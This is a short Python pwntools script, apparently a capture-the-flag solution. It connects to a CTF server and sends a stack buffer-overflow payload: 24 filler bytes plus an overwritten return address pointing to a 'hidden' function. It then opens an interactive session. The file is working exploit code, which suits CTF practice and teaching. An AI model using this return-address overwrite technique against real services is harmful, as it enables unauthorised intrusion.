from pwn import *

# r = remote("127.0.0.1", 8886)
r = remote("csie.ctf.tw", 10120)
context.arch = "amd64"

hidden = 0x400566
payload = "a" * 24 + p64(hidden)


r.sendline(payload)
r.interactive()

